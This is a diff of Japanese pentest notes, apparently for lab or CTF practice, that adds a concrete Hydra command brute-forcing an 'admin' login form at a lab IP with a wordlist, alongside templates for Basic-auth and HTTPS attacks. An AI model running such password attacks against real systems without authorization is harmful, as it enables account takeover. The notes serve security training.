@@ -24,18 +24,20 @@ Webログインフォームへのパスワードアタック(POST)
 ```zsh
 hydra -l <username> -P <wordlist> <target_ip> http-post-form "/<url残り>:<クエリ文字列>:F=<Failure_Message>" 
 ```
+```sh
+# 具体例
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt 10.10.10.43 http-post-form "/user/login.php:username=^USER^&password=^PASS^:F=Invalid Password!"
 ```
-
-- 💡：Errorメッセージのないログインフォームをパスワードアタックするようなことは少ない
 
 Basic authenticationへのパスワードアタック
 ```zsh
 hydra -l <username> -P <wordlist> <target_ip> http-get /<URL_path>
 ```
 
-> [!WARNING]
+> [!INFO]
 > - HTTPSの場合はhttp*s*-get
 > - JSONとの場合は相性が悪いため、ffufかBurp Suiteを使用
+> - Errorメッセージのないログインフォームをパスワードアタックするようなことは少ない
 
 特定サービスへのパスワードアタック
 ```zsh
